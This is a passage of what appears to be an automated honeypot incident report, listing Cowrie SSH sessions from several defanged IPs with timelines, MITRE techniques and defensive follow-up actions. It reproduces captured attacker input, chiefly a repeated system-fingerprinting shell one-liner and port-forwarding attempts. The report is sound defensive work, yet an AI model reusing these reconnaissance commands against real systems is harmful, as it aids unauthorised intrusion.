| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:31` | `cowrie.log.closed` |
| `2026-07-26 04:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29a52ed8031e

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-26 04:55 |
| **Last Seen** | 2026-07-26 04:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 522, Connection: close, User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136., Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:55:31` | `cowrie.session.connect` |
| `2026-07-26 04:55:31` | `cowrie.login.success` |
| `2026-07-26 04:55:32` | `cowrie.session.params` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:32` | `cowrie.command.input` |
| `2026-07-26 04:55:32` | `cowrie.command.failed` |
| `2026-07-26 04:55:43` | `cowrie.log.closed` |
| `2026-07-26 04:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffacefce0ef6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:55 |
| **Last Seen** | 2026-07-26 04:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:55:40` | `cowrie.session.connect` |
| `2026-07-26 04:55:40` | `cowrie.client.version` |
| `2026-07-26 04:55:40` | `cowrie.client.kex` |
| `2026-07-26 04:55:42` | `cowrie.login.success` |
| `2026-07-26 04:55:42` | `cowrie.session.params` |
| `2026-07-26 04:55:42` | `cowrie.command.input` |
| `2026-07-26 04:55:42` | `cowrie.command.input` |
| `2026-07-26 04:55:42` | `cowrie.command.input` |
| `2026-07-26 04:55:42` | `cowrie.command.input` |
| `2026-07-26 04:55:42` | `cowrie.command.input` |
| `2026-07-26 04:55:42` | `cowrie.command.success` |
| `2026-07-26 04:55:42` | `cowrie.command.input` |
| `2026-07-26 04:55:42` | `cowrie.command.input` |
| `2026-07-26 04:55:42` | `cowrie.command.input` |
| `2026-07-26 04:55:42` | `cowrie.command.input` |
| `2026-07-26 04:55:43` | `cowrie.log.closed` |
| `2026-07-26 04:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1067ae821d

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-26 04:55 |
| **Last Seen** | 2026-07-26 04:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 517, Connection: close, User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:55:43` | `cowrie.session.connect` |
| `2026-07-26 04:55:43` | `cowrie.login.success` |
| `2026-07-26 04:55:44` | `cowrie.session.params` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:44` | `cowrie.command.input` |
| `2026-07-26 04:55:44` | `cowrie.command.failed` |
| `2026-07-26 04:55:55` | `cowrie.log.closed` |
| `2026-07-26 04:55:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d19bc38e1d30

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:57 |
| **Last Seen** | 2026-07-26 04:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:57:17` | `cowrie.session.connect` |
| `2026-07-26 04:57:18` | `cowrie.client.version` |
| `2026-07-26 04:57:18` | `cowrie.client.kex` |
| `2026-07-26 04:57:19` | `cowrie.login.success` |
| `2026-07-26 04:57:20` | `cowrie.session.params` |
| `2026-07-26 04:57:20` | `cowrie.command.input` |
| `2026-07-26 04:57:20` | `cowrie.command.input` |
| `2026-07-26 04:57:20` | `cowrie.command.input` |
| `2026-07-26 04:57:20` | `cowrie.command.input` |
| `2026-07-26 04:57:20` | `cowrie.command.input` |
| `2026-07-26 04:57:20` | `cowrie.command.success` |
| `2026-07-26 04:57:20` | `cowrie.command.input` |
| `2026-07-26 04:57:20` | `cowrie.command.input` |
| `2026-07-26 04:57:20` | `cowrie.command.input` |
| `2026-07-26 04:57:20` | `cowrie.command.input` |
| `2026-07-26 04:57:21` | `cowrie.log.closed` |
| `2026-07-26 04:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1953b9970c23

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:58 |
| **Last Seen** | 2026-07-26 04:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:58:51` | `cowrie.session.connect` |
| `2026-07-26 04:58:52` | `cowrie.client.version` |
| `2026-07-26 04:58:52` | `cowrie.client.kex` |
| `2026-07-26 04:58:54` | `cowrie.login.success` |
| `2026-07-26 04:58:55` | `cowrie.session.params` |
| `2026-07-26 04:58:55` | `cowrie.command.input` |
| `2026-07-26 04:58:55` | `cowrie.command.input` |
| `2026-07-26 04:58:55` | `cowrie.command.input` |
| `2026-07-26 04:58:55` | `cowrie.command.input` |
| `2026-07-26 04:58:55` | `cowrie.command.input` |
| `2026-07-26 04:58:55` | `cowrie.command.success` |
| `2026-07-26 04:58:55` | `cowrie.command.input` |
| `2026-07-26 04:58:55` | `cowrie.command.input` |
| `2026-07-26 04:58:55` | `cowrie.command.input` |
| `2026-07-26 04:58:55` | `cowrie.command.input` |
| `2026-07-26 04:58:55` | `cowrie.log.closed` |
| `2026-07-26 04:58:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a915e76b3af

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:00 |
| **Last Seen** | 2026-07-26 05:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:00:25` | `cowrie.session.connect` |
| `2026-07-26 05:00:25` | `cowrie.client.version` |
| `2026-07-26 05:00:25` | `cowrie.client.kex` |
| `2026-07-26 05:00:26` | `cowrie.login.success` |
| `2026-07-26 05:00:28` | `cowrie.session.params` |
| `2026-07-26 05:00:28` | `cowrie.command.input` |
| `2026-07-26 05:00:28` | `cowrie.command.input` |
| `2026-07-26 05:00:28` | `cowrie.command.input` |
| `2026-07-26 05:00:28` | `cowrie.command.input` |
| `2026-07-26 05:00:28` | `cowrie.command.input` |
| `2026-07-26 05:00:28` | `cowrie.command.success` |
| `2026-07-26 05:00:28` | `cowrie.command.input` |
| `2026-07-26 05:00:28` | `cowrie.command.input` |
| `2026-07-26 05:00:28` | `cowrie.command.input` |
| `2026-07-26 05:00:28` | `cowrie.command.input` |
| `2026-07-26 05:00:28` | `cowrie.log.closed` |
| `2026-07-26 05:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c18d152e3c

| Field | Detail |
|---|---|
| **Source IP** | `78.189.17[.]35` |
| **First Seen** | 2026-07-26 05:01 |
| **Last Seen** | 2026-07-26 05:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:01:54` | `cowrie.session.connect` |
| `2026-07-26 05:01:55` | `cowrie.client.version` |
| `2026-07-26 05:01:55` | `cowrie.client.kex` |
| `2026-07-26 05:01:56` | `cowrie.login.success` |
| `2026-07-26 05:01:56` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.189.17[.]35` to AbuseIPDB if not already reported
- [ ] Block `78.189.17[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03adbf708774

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:01 |
| **Last Seen** | 2026-07-26 05:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:01:57` | `cowrie.session.connect` |
| `2026-07-26 05:01:57` | `cowrie.client.version` |
| `2026-07-26 05:01:57` | `cowrie.client.kex` |
| `2026-07-26 05:01:59` | `cowrie.login.success` |
| `2026-07-26 05:02:00` | `cowrie.session.params` |
| `2026-07-26 05:02:00` | `cowrie.command.input` |
| `2026-07-26 05:02:00` | `cowrie.command.input` |
| `2026-07-26 05:02:00` | `cowrie.command.input` |
| `2026-07-26 05:02:00` | `cowrie.command.input` |
| `2026-07-26 05:02:00` | `cowrie.command.input` |
| `2026-07-26 05:02:00` | `cowrie.command.success` |
| `2026-07-26 05:02:00` | `cowrie.command.input` |
| `2026-07-26 05:02:00` | `cowrie.command.input` |
| `2026-07-26 05:02:00` | `cowrie.command.input` |
| `2026-07-26 05:02:00` | `cowrie.command.input` |
| `2026-07-26 05:02:01` | `cowrie.log.closed` |
| `2026-07-26 05:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4259d40c3e20

| Field | Detail |
|---|---|
| **Source IP** | `122.186.249[.]6` |
| **First Seen** | 2026-07-26 05:02 |
| **Last Seen** | 2026-07-26 05:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:02:35` | `cowrie.session.connect` |
| `2026-07-26 05:02:36` | `cowrie.client.version` |
| `2026-07-26 05:02:36` | `cowrie.client.kex` |
| `2026-07-26 05:02:38` | `cowrie.login.success` |
| `2026-07-26 05:02:38` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.186.249[.]6` to AbuseIPDB if not already reported
- [ ] Block `122.186.249[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18ee5e516efd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:03 |
| **Last Seen** | 2026-07-26 05:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:03:27` | `cowrie.session.connect` |
| `2026-07-26 05:03:27` | `cowrie.client.version` |
| `2026-07-26 05:03:27` | `cowrie.client.kex` |
| `2026-07-26 05:03:29` | `cowrie.login.success` |
| `2026-07-26 05:03:30` | `cowrie.session.params` |
| `2026-07-26 05:03:30` | `cowrie.command.input` |
| `2026-07-26 05:03:30` | `cowrie.command.input` |
| `2026-07-26 05:03:30` | `cowrie.command.input` |
| `2026-07-26 05:03:30` | `cowrie.command.input` |
| `2026-07-26 05:03:30` | `cowrie.command.input` |
| `2026-07-26 05:03:30` | `cowrie.command.success` |
| `2026-07-26 05:03:30` | `cowrie.command.input` |
| `2026-07-26 05:03:30` | `cowrie.command.input` |
| `2026-07-26 05:03:30` | `cowrie.command.input` |
| `2026-07-26 05:03:30` | `cowrie.command.input` |
| `2026-07-26 05:03:31` | `cowrie.log.closed` |
| `2026-07-26 05:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a9a7dddecde

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:04 |
| **Last Seen** | 2026-07-26 05:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:04:53` | `cowrie.session.connect` |
| `2026-07-26 05:04:53` | `cowrie.client.version` |
| `2026-07-26 05:04:53` | `cowrie.client.kex` |
| `2026-07-26 05:04:55` | `cowrie.login.success` |
| `2026-07-26 05:04:56` | `cowrie.session.params` |
| `2026-07-26 05:04:56` | `cowrie.command.input` |
| `2026-07-26 05:04:56` | `cowrie.command.input` |
| `2026-07-26 05:04:56` | `cowrie.command.input` |
| `2026-07-26 05:04:56` | `cowrie.command.input` |
| `2026-07-26 05:04:56` | `cowrie.command.input` |
| `2026-07-26 05:04:56` | `cowrie.command.success` |
| `2026-07-26 05:04:56` | `cowrie.command.input` |
| `2026-07-26 05:04:56` | `cowrie.command.input` |
| `2026-07-26 05:04:56` | `cowrie.command.input` |
| `2026-07-26 05:04:56` | `cowrie.command.input` |
| `2026-07-26 05:04:56` | `cowrie.log.closed` |
| `2026-07-26 05:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cb02aa687d3

| Field | Detail |
|---|---|
| **Source IP** | `111.53.131[.]79` |
| **First Seen** | 2026-07-26 05:05 |
| **Last Seen** | 2026-07-26 05:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:05:43` | `cowrie.session.connect` |
| `2026-07-26 05:05:43` | `cowrie.client.version` |
| `2026-07-26 05:05:43` | `cowrie.client.kex` |
| `2026-07-26 05:05:45` | `cowrie.login.success` |
| `2026-07-26 05:05:46` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.53.131[.]79` to AbuseIPDB if not already reported
- [ ] Block `111.53.131[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cf3b0c3f498

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:06 |
| **Last Seen** | 2026-07-26 05:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:06:26` | `cowrie.session.connect` |
| `2026-07-26 05:06:26` | `cowrie.client.version` |
| `2026-07-26 05:06:26` | `cowrie.client.kex` |
| `2026-07-26 05:06:28` | `cowrie.login.success` |
| `2026-07-26 05:06:29` | `cowrie.session.params` |
| `2026-07-26 05:06:29` | `cowrie.command.input` |
| `2026-07-26 05:06:29` | `cowrie.command.input` |
| `2026-07-26 05:06:29` | `cowrie.command.input` |
| `2026-07-26 05:06:29` | `cowrie.command.input` |
| `2026-07-26 05:06:29` | `cowrie.command.input` |
